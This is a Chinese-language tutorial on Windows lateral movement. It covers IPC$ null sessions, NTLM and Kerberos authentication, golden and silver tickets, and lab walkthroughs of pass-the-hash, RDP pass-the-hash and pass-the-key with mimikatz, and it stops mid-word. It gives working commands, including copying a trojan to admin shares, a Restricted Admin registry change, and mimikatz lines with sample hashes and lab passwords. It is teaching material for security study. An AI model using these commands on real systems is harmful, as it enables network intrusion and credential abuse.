Tcp445,tcp139 FTP WindowslinuxunixmacOS等 发布网站，文件共享 Tcp21 NFS Linuxunix 网站发布，文件共享（mount） Tcp2049 下面这两个不应该叫做协议，而是一种系统自带的、用于建立共享资源连接的功能。 1-5 IPC连接IPC(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。想建立ipc连接，需要对方开启了ipc连接服务，一般默认是开启的。 利用IPC$，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 ## 139,445端口开启：ipc$连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示netbios协议的应用,我们可以通过139,445(win2000)端口实现对共享文件打印机的访问。 ## 管理员开启了默认共享：默认共享是为了方便管理员远程管理而默认开启的共享,即所有的逻辑盘和系统目录，我们通过ipc$连接可以实现对这些默认共享的访问。在黑客众多的入侵手段中，通过IPC$入侵成为目前比较常见的一种方式，其攻击步骤甚至可以说已经成为经典的入侵模式，许多朋友非常想搞清楚这是怎么回事。知己知彼，方能百战不殆，基于这种考虑，我们来了解一下这种入侵方式的基础知识。 ## IPC是Internet Process Connection的缩写，也就是远程网络连接。它是Windows NT2000XP特有的一项功能，就是在两个计算机进程之间建立通信连接。一些网络通信程序之间通信可以建立在IPC上面。打个比方，IPC连接就像是挖好的地道，程序可通过地道访问远程主机。默认情况下，IPC是共享的，也就是说微软已经为我们挖好了这个地道（IPC），因此，这种基于IPC的入侵也常常被简称为IPC入侵。IPC后面的$是共享的意思，不过是隐藏的共享，微软系统中用“$”表示隐藏的共享，比如C$就是隐藏的共享C盘。也就是说C盘是共享的，但是C盘没有那个“托手”标志。IPC$是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。利用IPC$，连接者甚至可以与目标主机建立一个空的连接而无需用户名与密码！当然对方机器必须打开IPC$共享，否则你是连接不上的。而利用这个空的连接，连接者还可以得到目标主机上的用户列表。 ## 问：建立IPC连接需要什么条件？ 答：建立IPC连接要求双方都是基于NT架构的系统。Windows Me9895都不可以。 ## 问：怎么才能建立IPC连接呢？需要什么黑客工具呢？ 答：建立IPC连接不需要任何黑客工具，在Windows里敲命令行就行了，但需要知道远程主机的用户名和密码。打开CMD后用如下命令：net use\\ip\\ipc$ “password” user:”username”进行连接。注意，如果远程服务器没有监听139或445端口，会话是无法建立的。也就是说IPC$需要对方开启139或445端口。 ## 问：建立IPC$之后黑客能做什么？ 答：如果黑客使用管理员权限的账号和目标连接IPC$，他就可以和对方系统做深入“交流”了。黑客可以使用各种命令行方式的工具，比如pstools系列、Win2000SrvReskit、telnethack等获得目标信息、管理目标的进程和服务等。如果目标开放了默认共享（没开的话，黑客会帮你开），黑客就可以上传木马并运行，也可以用tftp、ftp的办法上传，而dwrcc、VNC、RemoteAdmin等工具（木马）还具有直接控屏的功能，直接控制我们。如果是Win2000 server，黑客还会考虑开启终端服务以方便控制。 ## 问：别人无法和自己建立IPC$是否意味着我就不能和对方建立IPC$呢？ 答：不是的！发起IPC$和被建立IPC$是两个不同的概念。别人无法和自己建立IPC$并不影响自己是否能够和他人建立IPC$。 ## 问：我听说有个空连接，这是怎么回事呢？ 答：简单说来，空连接即不需要用户名和密码就可以建立IPC连接，但是这种连接是得不到什么权限的。建立空连接的命令：net use \\IP\\ipc$ “” user:””。空连接是在没有信任的情况下与服务器建立的会话（即未提供用户名与密码），但根据Win2000的访问控制模型，空会话的建立同样需要提供一个令牌，可是空会话在建立过程中并没有经过用户信息的认证，所以这个令牌中不包含用户信息，因此，这个会话无法在系统间发送加密信息，但这并不表示空会话的令牌中不包含安全标识符SID（它标识了用户和所属组），对于一个空会话，LSA提供的令牌的SID是S-1-5-7，这就是空会话的SID，用户名是：ANONYMOUS LOGON（这个用户名是可以在用户列表中看到的，但是无法在SAM数据库中找到，属于系统内置的账号），这个访问令牌包含下面伪装的组：Everyone，Network；在安全策略的限制下，这个空会话将被授权访问到上面两个组有权访问到的一切信息。 ## 问：空连接有什么用？ 答：对于NT，在默认安全设置下，借助空连接可以列举目标主机上的用户和共享，访问Everyone权限的共享，访问小部分注册表等，并没有什么太大的利用价值；对Win2000作用更小，因为在Win2000和以后版本中默认只有管理员和备份操作员有权从网络访问到注册表，而且实现起来也不方便，需借助工具。从这些我们可以看到，这种非信任会话并没有多大的用处，但从一次完整的IPC$入侵来看，空连接是一个不可缺少的跳板，因为我们从它那里可以得到用户列表，空连接还可以列举用户和组，目标系统类型等。这对于一个老练的黑客已经足够了。 ## 问：如何利用空连接得到远程主机的用户列表 答：首先，先建立一个空会话（需要目标开放ipc$），用命令：net use \\ip\\ipc$ “” user:””即可建立空连接。然后用命令：net view \\IP命令查看远程主机的共享资源，如果对方开了共享，就可以列出共享名、类型及其注释。最后再使用nbtstat -A IP命令就可以得到远程主机的NetBIOS用户名列表（需要打开自己的NBT）。注意，建立IPC$连接的操作会在EventLog中留下记录，不管你是否登录成功。 ## 问：空连接和IPC$是一回事吗？ 空连接和IPC$是不同的概念。空连接是在没有信任的情况下与服务器建立的会话，换句话说，它是一个到服务器的匿名访问。IPC$是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限。IPC$连接可以实现远程登陆及对默认共享的访问。 ## 问：IPC$是个漏洞吗？ 许多文章中都提到了IPC$漏洞，其实，IPC$并不是真正意义上的漏洞，它是为了方便管理员的远程管理而开放的远程网络登陆功能，而且还打开了默认共享，即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$)。所有的这些，其初衷都是为了方便管理员的管理，但一些别有用心者会利用IPC$访问共享资源，导出用户列表，并使用字典工具进行密码探测，寄希望于获得更高的权限，从而达到不可告人的目的。从这个角度来说，IPC$常常被黑客所利用。 ## 问：IPC$连接成功后，我用net uset kkk add命令建立了一个账户，却发现这个账户在我自己的机器上，这是怎么回事？ 答：IPC$建立成功只能说明你与远程主机建立了通信隧道，并不意味你取得了一个shell，只有在获得一个shell之后，你才能在远程建立一个账户，否则你的操作只是在本地进行。 ## 问：我建立ipc$连接的时候返回如下信息：‘提供的凭据与已存在的凭据集冲突’，怎么回事？ 答：这说明你与目标主机建立了一个以上的IPC$连接，这是不允许的，把其他的删掉吧。用如下命令计量：net use \\*.*.*.*\\ipc$ del。 ## 问：IPC$与默认共享有什么联系？ 答：默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$)，我们通过ipc$连接可以实现对这些默认共享的访问，前提是对方没有关闭这些默认共享。 ## 问：只要对方开放了139端口或者445端口就可以建立IPC$吗？ 答：这种想法不一定正确！139、445端口开放了未必可以建立IPC$，但IPC$可建立则表示对方的139端口或445端口开放了。 ## 问：怎样映射和访问默认共享？ 答：使用命令net use z: \\目标IP\\c$ “密码” user:”用户名”命令，将对方的c盘映射为自己的z盘，其他盘类推。如果已经和目标建立了IPC$，则可以直接用IP加盘符加$访问。比如执行copy muma.exe\\IP\\d$\\path\\muma.exe命令，或者再映射也可以，只是无需用户名和密码了，例如输入：net use y:\\IP\\d$命令。然后再执行copy muma.exe y:\\path\\muma.exe即可。当路径中包含空格时，须用””将路径全引住。 ## 问：如何删除映射和ipc$连接？ 答：用命令net use \\IP\\ipc$ del可以删除和一个目标的IPC$连接。用命令net use z: del删除映射的Z盘，其他盘类推。而用命令net use * del可以删除全部，在删除时会有提示要求按“y”键确认。 问：如何防范IPC$入侵？ ## 答：首先要禁止空连接进行枚举(此操作并不能阻止空连接的建立)。运行regedit，找到： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA下的DWORD值RestrictAnonymous的键值改为：00000001。 ## 除了上面的方法，你也可以通过屏蔽139，445端口来防范别人通过IPC$来入侵，因为没有139，445端口的支持是无法建立IPC$的，因此屏蔽139，445端口同样可以阻止IPC$入侵。 1-6 UNC路径访问## UNC（Universal Naming Convention）：通用命名规则，也称通用命名规范、通用命名约定。 ## UNC为网络（主要指局域网）上资源的完整Windows名称。这种方式也是基于SAM文件共享协议来实现数据传输的。 ## 格式：\\servername\\sharename，其中servername是服务器名。sharename是共享资源的名称。 ## 目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。 ## 共享文件过程 ## 首先创建文件夹，右键共享，高级共享。在以上选项可选时依次执行。 ## 访问该文件夹，在同网络中，输入\\ + 对方的ip或+对方的主机名即可访问对方共享的文件夹 ## 共享文件的功能基于445号端口，如果在\\+主机名的形式访问，还需要Netbios-ns137 、138以及TCP139端口。 ## 关闭139端口的方法：“网络连接属性TCPIP协议属性高级WINS中设置启用或者禁用NBT（NetBIOSover TCPIP） ## 关闭445端口的方法：防火墙阻塞445端口或者禁用server服务都可以。 通过ip地址连接 其实上面是省略写法，它是基于file协议的 通过主机名连接 2-2 Windows登录认证流程早期SMB协议在网络上传输明文口令。后来出现 LAN Manager ChallengeResponse验证机制，简称LM，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战响应验证机制，称之为NTLM。已经有了更新的NTLM v2以及Kerberos验证体系，NTLML V2比V1更加安全一些。NTLM是windows早期安全协议，因向后兼容性而保留下来。NTLM是NTLAN Manager的缩写，即NT LAN管理器。 Windows NT系列包含的系统版本：https://www.365jz.com/article/24850 在windows 2000之后，Kerberos是域环境下的首选认证方式，但是如果Kerberos没有开启或者因为某种原因导致功能失效，那么还是会使用NTML的方式来进行认证，在这windows 2000之前域环境下的认证都是通过NTML实现的。但是工作组环境的认证目前还是使用的NTML认证方式。 2-1 本地登录认证## Windows的本地认证流程大致可以抽象为以下三个步骤； 1、由 winlogon.exe进程接受用户输入的密码 2、调用lsass.exe进程对用户输入的密码进行加密，将其转换为NTLM Hash 3、将有密码转换成的NTLM Hash与SAM文件中存储的NTLM Hash进行比较，如相同，将GroupSid与UserSid发送给winlogon.exe准备登陆，如不同则登陆失败 winlogon.exe即 Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。 lsass.exe即Local Security Authority Service，是Windows系统的安全机制。它用于本地安全和登陆策略。 SAM，这里说的的SAM是Security Account Manager，不是上面提到的SAM协议昂，这是Windows对用户账户的安全管理使用的安全账号管理器，SAM文件即账号密码数据库文件。 SAM文件的默认存储路径为：%SystemRoot%\\system32\\config\\samNTLM Hash是Windows所采用的一种加密算法，其流程如下； 明文转换为16进制ASCII码 使用little-endian(小端)序将其在转换为Unicode格式 对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值 例如 过程图解： 登录成功之后，将用户的sid和属于sid发送给winlogon.exe进程，并且按照sid来启动相应的服务、进程，而且划分好目录、文件的操作权限等工作。 2-2 网络登录流程网络登录认证流程主要是指工作组或者域环境之间的主机互相访问对方的资源时需要做的身份认证过程，正常是通过SMA服务的445端口，目前在工作组之间主要使用的NTML验证机制，在域环境中目前主要是Kerberos验证机制，如果kerberos机制因为某种原因没有开启，那么域的认证机制还是会采用NTML验证机制。 **2-2-1 NTML 认证** NTML是一种基于挑战(Chalenge)和响应(Response)的认证机制。它的认证过程大致有下面三步： 协商：主要用于确认双方协议版本。 质询：就是挑战（Chalenge）响应（Response）认证机制起作用的范畴。 验证：验证主要是在质询完成后，验证结果，是认证的最后一步 **1-1 工作组环境下的NTML认证流程** NTLM是一种网络认证协议，它是基于挑战（Challenge）响应（Response）认证机制的一种认证模式。(这个协议只支持Windows)，由三种消息组成：通常称为type 1(协商)，类型type 2(质询)和type3(身份验证)。 第一步,首先在client输入username,password和domain,然后client会把password hash后的值先缓存到本地 第二步,之后,client把username的明文发送给server(DC) 第三步,DC会生成一个 16字节的随机数,即challenge(挑战码),再传回给client 第四步,当client收到challenge以后,会先复制一份出来,然后和缓存中的密码hash再一同混合hash一次,混合后的值称为response,之后client再将challenge,response及username一并都传给server 第五步,server端在收到client传过来的这三个值以后会把它们都转发给DC 第六步,当DC接到过来的这三个值的以后,会根据username到域控的账号数据库(ntds.dit)里面找到该username对应的hash,然后把这个hash拿出来和传过来的challenge值再混合hash 第七步,将( 6)中混合后的hash值跟传来的response进行比较,相同则认证成功,反之,则失败,当然,如果是本地登录,所有验证肯定也全部都直接在本地进行了 **1-2 域环境下的NTML认证流程** NTML版本区别 NTLM v1与NTLM v2最显著的区别就是 Challenge 与加密算法不同，共同点就是加密的原料都是NTLM Hash。 ## 下面细说一下有什么不同: Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。 Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。 **2-2-2 域环境下的Kerberos认证流程****Kerberos介绍** kerberos是一种网络认证协议，通过密钥系统为客户端以及服务器端提供认证服务，该过程不依赖于主机操作系统认证，不依赖主机地址信任，不要求网络内所有主机物理安全（假定该网络上的所有数据可以任意进行读取，修改）。kerberos作为可信任的第三方服务，是通过传统密码技术，进行安全服务的。 **Kerberos认证中的关键字** 域控制器（Domain Controller，DC） 密钥分发中心（Key Distribution Center，KDC） 帐户数据库（Account Database，AD） 身份验证服务（Authentication Service，AS） 入场卷[认证票据]（Ticket Granting Ticket，TGT） 票据发放服务（Ticket Granting Service，TGS） 票据（Ticket） Master Key Long-term Key |长期密钥（被 Hash加密的用户密钥） Session Key Short-term Key | 短期会话密钥 krbtgt 账户 Account Database：类似于 SAM的数据库，存储所有 Client的白名单，只有处于白名单中的 Client才可以成功申请 TGT Authentication Service：为 Client生成 TGT的服务 Ticket Granting Ticket：入场券，通过入场券能够获得票据，是一种临时凭证的存在 Ticket Granting Service：为 Client生成某个服务的票据 Ticket：票据，网络对象互相访问的凭证 Master Key：长期密钥。将本机密码进行 Hash运算（NTML）得到一个Hash Code, 我们一般管这样的 Hash Code叫做 Master Key Session Key：短期会话密钥。一种只在一段时间内有效的 Key krbtgt账户：每个域控制器都有一个 krbtgt的用户账户，是 KDC的服务账户，用来创建票据授予服务 (TGS)加密的密钥 Kerberos认证的三只狗头指的是如下三个角色： Client Server DC（KDC）。在 Windows域环境中，KDC的角色由 DC（Domain Controller）来担当 1)首先,客户端(client)将域用户的密码hash一次并保存,然后,以此hash来作为客户端和KDC之间的长期共享密钥kc 2)之后,客户端(client)开始利用( 1)中的域用户密码hash再把时间戳,clientid,TGS id等信息混合hash一次,然后向as(认证服务器 [Authentication Server])服务器进行请求 3)as接到该请求后,利用长期共享密钥(kc)进行解密,解密成功后,会返回给客户端两个票据 (1)加密的K(c,tgs)(用于客户端后续向KDC发起请求),TGS NameID,时间戳等,该票据由Kc加密 (2)票据授予票据(Ticket Granting Ticket,简称TGT),该票据是给TGS的,票据的内容包括K(c,tgs),Client身份信息,域名,时间戳等,该票据由TGS的秘钥加密,只有TGS能够解密 4)然后,客户端会利用长期共享密钥解密k(c,tgs),并利用该秘钥加密生成一个Authenticator,内容包括:lifetime,时间戳,Client身份信息等,连同从AS获取的TGT一并发送给TGS 5)TGS利用自身的秘钥解密TGT,获取K(c,tgs),并用K(c,tgs)解密客户端发送的Authenticator,对Client进行认证,如果Client通过了认证,TGS随机生成一个Session Key K(c,s),并产生两个票据 (1)服务票据(Ts) :这是给服务器的服务票据,由Server秘钥Ks加密,内容包括：K(c,s),Client身份信息,Service ID,时间戳,lifetime等 (2)客户端票据(Tc)：该票据由K(c,tgs)加密,内容包括：K(c,s),Server身份信息等 6)客户端收到tgs的回应后,利用K(c,tgs)解密Tc,获取K(c,s),Server身份信息等,并利用K(c,s)加密生成一个Authenticator发送给Server,内容包括 :时间戳,Client ID等信息,连同Ts一并发送给Server 7)Server端在收到Client的请求后,利用自身秘钥Ks解密Ts,得到K(c,s),再利用K(c,s)解密Authenticator,对Client进行认证,如果认证通过,则表示KDC已经允许了此次通信,此时Sever无需与KDC通信,因为Ks为KDC和Sever之间的长期共享秘钥,如果在有效时间内,则此次请求有效 关于kerberos利用方法: 1) 黄金票据(Golden Ticket) ## 先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务 2) 白银票据(Silver Ticket) ## 通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信关于黄金票据和白银票据的一些区别: 1)访问权限不同 Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限 Silver Ticket: 伪造TGS,只能访问指定的服务 2)加密方式不同 Golden Ticket 由Kerberos的Hash加密 Silver Ticket 由服务账号(通常为计算机账户)Hash加密 3)认证流程不同 Golden Ticket 的利用过程需要访问域控,而Silver Ticket不需要 ## 小结: ## 这些其实都是域内渗透最基础的知识,所以觉得大家还是非常有必要多花点儿时间,好好深刻体会一下,另外,微软给我们的建议是,尽量们不要直接使用NTLM,而使用negotiate,如果使用的是negotiate,windows则会先判断kerberos是否可用,如果可用就优先使用kerberos,否则才会使用NTLM,kerberos的安全性确实要比NTLM要高很多 **Kerberos介绍认证中涉及到的角色** AS（Authentication Server） 认证服务器 KDC（Key Distribution Center） 密钥分发中心 TGT（Ticket Granting Ticket） 票据授权票据，票据的票据 TGS（Ticket Granting Server） 票据授权服务器 SS（Service Server） 特定服务提供端 简单来说 ## 客户端用户发送自己的用户名到KDC服务器以向AS服务进行认证。KDC服务器会生成相应的TGT票据，打上时间戳，在本地数据库中查找该用户的密码，并用该密码对TGT进行加密，将结果发还给客户端用户。该操作仅在用户登录或者kinit申请的时候进行。 客户端收到该信息，并使用自己的密码进行解密之后，就能得到TGT票据了。这个TGT会在一段时间之后失效，也有一些程序(session manager)能在用户登陆期间进行自动更新。 当客户端用户需要使用一些特定服务(Kerberos术语中用”principal”表示)的时候，该客户端就发送TGT到KDC服务器中的TGS服务。当该用户的TGT验证通过并且其有权访问所申请的服务时，TGS服务会生成一个该服务所对应的ticket和session key，并发还给客户端。客户端将服务请求与该ticket一并发送给相应的服务端即可。具体的流程请看下面的描述。 **AD活动目录** Active Directory(活动目录)概念 ## Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。Active Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。 ## 网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。Active Directory(活动目录)功能服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。 ## 用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮 件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。 ## 资源管理:管理打印机、文件共享服务等网络资源。 ## 桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。 ## 应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。这个中间就需要Kerberos认证协议来验证网络对象间的权限。 **SPN** 介绍 https://zhuanlan.zhihu.com/p/474062138 ## 服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册 SPN。 作用 ## 当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给客户，并将需要访问的SPN发送给KDC。 ## KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。 查询 # 查看当前域内所有的SPN setspn -q ** 在域控主机上执行，就能看到如下效果: **认证流程** AS_REQ(认证服务请求)：## Client向KDC发送AS_REQ，请求的凭据是Client的hash(这个hash是根据输入的密码生成的)加密的时间戳。 AS_REP(认证服务响应)：# KDC向发出AS_REQ的Client发出响应，去如果认证成功就返回一个TGT TGS_REQ(票据发放服务请求)：# Client凭借TGT向KDC发送对某一Server的TGS_REQ TGS_REP(票据发放服务响应)：# KDC验证TGT，如果验证正确就根据请求的服务返回对应的TGS,不管是否有权向访问Server AP_REQ(服务请求)：# Client凭借TGS向Server发起服务请求 AP_REP(服务响应)：# Server验证TGS，如果验证正确就向KDC询问，Client是否有权限获得服务，如果有就返回响应 **黄金票据和白银票据** ## 黄金票据：当黑客可以获得Krbtgt用户的NTLM-Hash就代表着黑客便可主动使用krbtgt用户的NTLM哈希做为密钥来生成TGT发送给KDC，这样KDC如果可以解密并且对比里面的数据都没问题，便成功骗过了KDC，也就是成功伪造了黄金票据。白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，如果获取到了要访问的Server的NTLM Hash，便可伪造Ticket，伪造后直接发送给server，那么server使用自己的NTLM Hash正常解密完成比对，也就是成功伪造了白银票据。 ## 黄金和白银对比： 1. 黄金票据伪造之后发送给KDC来验证，容易留下痕迹或者说日志记录 2. 白银票据的验证不需要经过KDC，直接发送给server端的，不容易留下痕迹或者日志 3. 通过TGT可以申请到多个TGS票据 4. 一个TGS票据只能访问一个特定的服务 2-3 PTH**3-1 PTH 介绍** ## 全称：Pass The Hash，在NTLM 协议的验证过程中虽然没有明文传递密码，但是却使用了明文密码的等价物NTLM Hash，所以在不知道明文密码但是获取到NTLM Hash的情况即可完成身份的认证，这种认证方式因为传递的是hash值故成为哈希传递。要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge，然后使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。 哈希传递的作用是：解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又想继续渗透其他主机的问题。 实现传递的必要条件 1. 哈希传递需要被认证的主机能够访问到服务器 2. 哈希传递需要知道并传递被认证主机的用户名 3. 哈希传递需要知道并传递被认证用户的NTLM Hash PTH的利用工具很多 mimikatz，CrackMapExec，Smbmap，Smbexec，Metasploit等等 PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。 注意问题：KB2871997补丁后的影响 没打补丁用户都可以连接，打了补丁只能administrator连接 但是还有一种手法叫做PTK，下面我们会学到 PTK：打了这个补丁的，才能使用所有用户来连接，采用aes256连接 PTH这种手法利用的是NTML认证协议。 下面我们来实验一下 一、信息收集 先通过mimikatz等工具收集一下信息，重点是收集用户的NTML hash数据，注意，使用mimikatz需要管理员权限，所以我们以本地管理员的身份先登录到webserver主机，并打开powershell收集本地管理员和域用户的hash密码信息 本地管理员的： 本机登陆过的域用户的： 其实PTH这个手法和我们前面说到的hash口令传递攻击用起来差不多，只是原理不太一样而已。这种攻击手法其实算是运气攻击，因为我们获取的密码是webserver主机的用户名和密码，如果域控的管理员也是这个密码，那么就能传递成功。 privilege::debug ## 在未打补丁的工作组及域连接： sekurlsa::pth user:[用户名] domain:[域名或“workgroup”] ntlm:[ntlm的值] 连接域控：sekurlsa::pth user:administrator domain:god ntlm:ccef208c6485269c20db2cad21734fe7 连接sqlserver：sekurlsa::pth user:dbadmin domain:god ntlm:518b98ad4178a53695dc997aa02d455c 本地用户连接：sekurlsa::pth user:administrator domain:workgroup ntlm:ccef208c6485269c20db2cad21734fe7 # 使用本地用户连接的时候，我们domain的值为workgroup 第一步，先看一下域控主机的主机名和域名，随便找个主机查看一下，必须域用户登录的才可以查到昂。 将这个名字保存下来，因为一般使用PTH攻击手法的话需要用这个计算机名和域名，不要用ip地址，因为域中主机识别是基于DNS解析来找的。 \\OWA2010CN-God.god.org直接使用本地用户通过域控主机名来连接一下域控主机，看看效果： 失败了，再通过域控主机的ip地址连接一下看效果 也是失败了。因为直接连接肯定是不行的，因为没有凭据 **3-2 PTH 攻击** mimikatz 我们通过mimikatz来进行pth传递攻击： 攻击成功，并且一会儿会自动弹出一个shell终端窗口，在弹出的窗口中就可以连接上域控主机了。先用ip地址尝试连接，这里可以连接上，如果不能连接的话，就换成域控主机的那个主机名来连接 net use \\192.168.241.21\\c$ dir \\192.168.241.21\\c$ PTH成功，注意，只能在弹出的这个窗口中才能连接昂。 好，已经连接上域控主机了，那么就可以像at或者schtasks的攻击方式一样了，复制文件、执行文件来控制域控主机了。 这次攻击能够成功的原因是，域控主机上有这个administrator用户，并且NTLM hash密码和web主机的一样，所以属于运气攻击。其实我们目前的实验环境下，域控主机的administrator用户的hash密码在web主机上是没有的，我为了给大家演示效果才这样设计的，前期还是需要我们一步一步的信息收集，收集到域控主机的hash密码。 **3-3 RDP的PTH攻击** ## 当遇到目标主机无法通过lsass.exe进程抓取明文密码，或者是密码强度太大经常会遇到拿到hash却解不开的情况，我们就可以采用凭据传递攻击（Pass-The-Hash）。 ## 新版的RDP远程桌面协议中有一个“受限管理员”（Restricted Admin）的特性，通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。所以在开启凭据传递攻击（Pass-The-Hash）前，要先确保目标主机开启了Restricted Admin Mode，开启后我们便可以使用Hash来直接实现RDP远程登录。 ## windows Server需要开启Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7和Windows Server 2008 R2安装了2871997、2973351补丁也支持。前面我们讲过RDP的暴力破解、3389端口的探测和查询(netstat -ano等)和开启手法等。 ## 关于与目标主机建立连接的方式我们前面提到过IPC、WMI、SMB等协议的连接，接下来我们再说一个RDP协议的连接。支持明文和hash传递连接。 ## 我们在渗透过程中可以通过修改注册表的方式开启目标主机的Restricted Admin Mode，值为0代表开启，值为1代表关闭： REG ADD “HKLMSystemCurrentControlSetControlLsa” v DisableRestrictedAdmin t REG_DWORD d 00000000 f ## 查看是否成功开启: REG query “HKLMSystemCurrentControlSetControlLsa” | findstr “DisableRestrictedAdmin” RDP 明文连接 Windows：mstsc（远程桌面连接）-输入账号密码 Windows命令行：mstsc.exe console v:[IP] admin Linux：（需要安装rdesktop）rdesktop [IP] 实验开始，比如我们使用hash传递，让webserver主机连接一下sqlserver2012主机。 先开启sqlserver主机的远程连接 查看sqlserver主机的ip地址 获取sqlserver的hash密码和用户名 * Username : Administrator * Domain : SQLSERVER * NTLM : 518b98ad4178a53695dc997aa02d455c * SHA1 : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39 使用webserver主机的远程桌面 先看看明文连接 等一会儿就连接上了 RDP HASH连接 mstsc.exe restrictedadmin mimikatz.exe privilege::debug sekurlsa::pth user:administrator domain:SQLSERVER ntlm:518b98ad4178a53695dc997aa02d455c “run:mstsc.exe restrictedadmin” 看到上面的窗口表示我们当前的攻击主机系统不支持Restricted Admin mode，执行后弹出远程桌面的 参数说明。 如果当前系统支持Restricted Admin mode，执行后弹出远程桌面的登录界面。 windows server2012是支持并且默认开启这个Restricted Admin mode，所以我们通过sqlserver主机 来连接一下webserver主机： sekurlsa::pth user:administrator domain:WEBSERVER ntlm:518b98ad4178a53695dc997aa02d455c “run:mstsc.exe restrictedadmin” 填写ip地址之后，点击连接即可，不需要输入用户名和密码 但是又报错了 md，再试一个，远程连接jackpc那个win8主机，别忘了先开启win8允许远程连接的功能，而且激活administrator然后运行mimikatz收集administrator的NTML hash密码， jack的ip地址为192.168.241.29 win8.1 x64 jack-pc 域内个人机 ## 本地管理员账号密码 .\\jack : admin ## 当前机器域用户密码 god\\boss : Admin12345 ## 获取信息： * Username : Administrator * Domain : Jack-PC * NTLM : ccef208c6485269c20db2cad21734fe7 * SHA1 : 58d1a25c09f4ee98209941b2b333fbe477d472a9 ## hash传递 sekurlsa::pth user:administrator domain:WEBSERVER ntlm:ccef208c6485269c20db2cad21734fe7 “run:mstsc.exe restrictedadmin” 2-4 PTKPTK也是针对NTML的认证进行的一种攻击手法，原理是通过获取用户的aes hmac值来完成登录认证，这个可以用在我们无法获取当前主机的密码的情况下。而且是在打了KB2871997补丁之后才能用这个方法 privilege::debug sekurlsa::ekeys 导出key值 mimikatz.exe “privilege::debug” “sekurlsa::ekeys” keys.txt PTK传递，就传递的这个值。 sekurlsa::pth user:[用户名] domain:[域名或“workgroup”] aes256:[aes256的值] ## 通过本地管理员用户来连接mary主机：sekurlsa::pth user:mary domain:god.org aes256:329cb15457daf7747d932ee19a39a9e9aa7d561eea642123796ecb5a9dded088 PTK攻击mary主机 win7 x64 mary-pc 域内个人机 本地管理员账号密码 .\\mary : admin # 可以自行开启administrator 密码设置为admin!@#45 当前机器域用户密码 god\\mary : admin!@#45 先用管理员登录，然后我们收集一下mary的aes的值，其实按说我们应该在webserver主机上搜昂，但是webserver上没有。 下面是个失败的演示，应该是key没有用对，后面再说这个吧。 2-5 PTTPTT全称pass the 